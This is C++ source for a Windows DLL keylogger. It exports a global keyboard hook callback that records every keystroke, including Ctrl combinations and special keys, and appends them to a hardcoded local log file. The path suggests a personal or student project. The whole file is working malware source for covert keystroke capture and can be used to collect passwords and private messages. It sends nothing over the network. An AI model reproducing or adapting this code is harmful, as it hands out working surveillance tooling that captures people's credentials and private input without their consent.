#include <windows.h>
#include <string>
#include <fstream>
HHOOK hGlobalHook = NULL;
using namespace std;
ofstream out;

void WriteStringToFile(string str);
void WriteEnterToFile();

extern "C" __declspec(dllexport) LRESULT CALLBACK LogKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        bool isDownShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
        bool isDownCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
        bool isDownCtrl = ((GetKeyState(VK_CONTROL) & 0x80) == 0x80 ? true : false);
        byte keyState[256];
        GetKeyboardState(keyState);
        WORD w;

        KBDLLHOOKSTRUCT *keycode = (KBDLLHOOKSTRUCT *)lParam;
        if (keycode->vkCode == VK_BACK)
            WriteStringToFile("/Backspace/");
        if (keycode->vkCode == VK_DELETE)
            WriteStringToFile("/Delete/");
        if (keycode->vkCode == VK_RETURN)
        {
            WriteStringToFile("/Enter/");
            WriteEnterToFile();
        }
        if (keycode->vkCode == VK_HOME)
            WriteStringToFile("/Home/");
        if (keycode->vkCode == VK_END)
            WriteStringToFile("/End/");
        if (keycode->vkCode == VK_LEFT)
            WriteStringToFile("/Left/");
        if (keycode->vkCode == VK_RIGHT)
            WriteStringToFile("/Right/");
        if (keycode->vkCode == VK_DOWN)
            WriteStringToFile("/Down/");
        if (keycode->vkCode == VK_UP)
            WriteStringToFile("/Up/");
        else if (ToAscii(keycode->vkCode, keycode->scanCode, keyState, &w, keycode->flags) == 1)
        {
            char key = char(w);
            if ((isDownCapslock ^ isDownShift) && ((key >= 65 && key <= 90) || (key >= 97 && key <= 122)))
            {
                key = toupper(key);
            }
            if (isDownCtrl)
            {
                char str[100];
                sprintf(str, "{Ctrl - %c}", (char)keycode->vkCode);
                WriteStringToFile(str);
            }
            else
            {
                char str[100];
                sprintf(str, "%c", key);
                WriteStringToFile(str);
            }
        }
    }
    return CallNextHookEx(hGlobalHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void SetGlobalHook(HHOOK hHook)
{
    hGlobalHook = hHook;
}

void WriteStringToFile(string str)
{
    out.open("D:\\Truong\\DaMang\\keylog.text", ios_base::app);
    out << str;
    out.close();
}

void WriteEnterToFile()
{
    out.open("D:\\Truong\\DaMang\\keylog.text", ios_base::app);
    out << "\n";
    out.close();
}

/*
    arg[1] : library instance handle
    arg[2] : reason this function is being called
    arg[3] : not used
*/
BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)

{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    default:
        break;
    }
    return true;
}

